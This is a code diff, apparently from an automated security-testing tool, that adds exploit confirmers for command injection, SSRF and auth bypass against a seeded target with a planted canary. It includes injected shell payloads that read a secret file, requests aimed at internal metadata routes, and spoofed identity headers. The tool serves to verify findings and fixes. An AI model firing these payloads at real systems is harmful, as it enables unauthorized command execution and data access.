@@ -119,9 +119,112 @@ def confirm_path_traversal(base_url: str, endpoint: str, input_source: str, time
     )
 
 
+# --- Shared firing helper ----------------------------------------------------
+
+def _fire_get(base_url: str, endpoint: str, param: str, payloads: list[str], timeout: float) -> ConfirmResult:
+    """Fire each payload as a GET query param; record every attempt for the oracle."""
+    url = f"{base_url.rstrip('/')}{endpoint}"
+    fired_req = ""
+    combined = ""
+    attempts: list[tuple[str, str]] = []
+    try:
+        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
+            for p in payloads:
+                req = client.build_request("GET", url, params={param: p})
+                resp = client.send(req)
+                fired_req = str(req.url)
+                attempts.append((f"GET {fired_req}", resp.text))
+                combined += f"\n[{p}] -> {resp.status_code}\n{resp.text[:300]}"
+    except httpx.HTTPError as exc:
+        combined += f"\n[transport error] {exc}"
+    return ConfirmResult(
+        fired=bool(fired_req),
+        exploit_request=f"GET {fired_req}",
+        observable=combined[:400],
+        response_text=combined,
+        attempts=attempts,
+    )
+
+
+# --- Command injection -------------------------------------------------------
+
+def confirm_command_injection(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+    """Append a command that reads the planted secret file; the oracle checks for the canary.
+
+    NOTE: the payloads read ``app_secret.txt`` -- the file canary planted on the
+    seeded target. A general run must instead reference the per-run canary path
+    Cerberus planted; wiring that through is part of generalizing beyond the
+    seeded targets.
+    """
+    _, param = _split_source(input_source)
+    payloads = [
+        "127.0.0.1; cat app_secret.txt",
+        "127.0.0.1 && cat app_secret.txt",
+        "127.0.0.1 | cat app_secret.txt",
+        "$(cat app_secret.txt)",
+        "`cat app_secret.txt`",
+        "x; cat ../app_secret.txt",
+    ]
+    return _fire_get(base_url, endpoint, param, payloads, timeout)
+
+
+# --- SSRF --------------------------------------------------------------------
+
+def confirm_ssrf(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+    """Make the server fetch an internal-only endpoint; success is the canary coming back."""
+    _, param = _split_source(input_source)
+    base = base_url.rstrip("/")
+    payloads = [
+        f"{base}/internal/metadata",  # the server can reach its own internal route
+        "http://127.0.0.1/internal/metadata",
+        "http://localhost/internal/metadata",
+    ]
+    return _fire_get(base_url, endpoint, param, payloads, timeout)
+
+
+# --- Auth bypass / IDOR ------------------------------------------------------
+
+def confirm_auth_bypass(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+    """Request objects the caller does not own; the canary belongs to another user.
+
+    Also spoofs a client identity header matching the requested id -- so a "fix"
+    that merely trusts a client-supplied identity is caught here and NOT certified.
+    """
+    _, param = _split_source(input_source)
+    url = f"{base_url.rstrip('/')}{endpoint}"
+    probes = [
+        ({param: "2"}, None),
+        ({param: "2"}, {"X-User": "2"}),  # spoof the identity a naive patch might trust
+        ({param: "3"}, {"X-User": "3"}),
+        ({param: "0"}, None),
+        ({param: "9999"}, None),
+    ]
+    fired_req = ""
+    combined = ""
+    attempts: list[tuple[str, str]] = []
+    try:
+        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
+            for params, headers in probes:
+                req = client.build_request("GET", url, params=params, headers=headers or {})
+                resp = client.send(req)
+                fired_req = str(req.url)
+                label = f"GET {fired_req}" + (f" (X-User: {headers['X-User']})" if headers else "")
+                attempts.append((label, resp.text))
+                combined += f"\n[{params} hdr={headers}] -> {resp.status_code}\n{resp.text[:200]}"
+    except httpx.HTTPError as exc:
+        combined += f"\n[transport error] {exc}"
+    return ConfirmResult(
+        fired=bool(fired_req),
+        exploit_request=f"GET {fired_req}",
+        observable=combined[:400],
+        response_text=combined,
+        attempts=attempts,
+    )
+
+
 # --- Registry ----------------------------------------------------------------
 
-# NOTE: both confirmers today fire GET requests with the payload in a query
+# NOTE: confirmers today fire GET requests with the payload in a query
 # parameter. Sinks fed from POST bodies, headers, cookies, or JSON are flagged
 # by the sweep but not yet confirmable -- adding method/source-aware payload
 # delivery is the next confirmer increment. Until then such candidates surface
@@ -129,6 +232,9 @@ def confirm_path_traversal(base_url: str, endpoint: str, input_source: str, time
 CONFIRMERS = {
     "sqli": confirm_sqli,
     "path_traversal": confirm_path_traversal,
+    "command_injection": confirm_command_injection,
+    "ssrf": confirm_ssrf,
+    "auth_bypass": confirm_auth_bypass,
 }
 
 FIXES = {
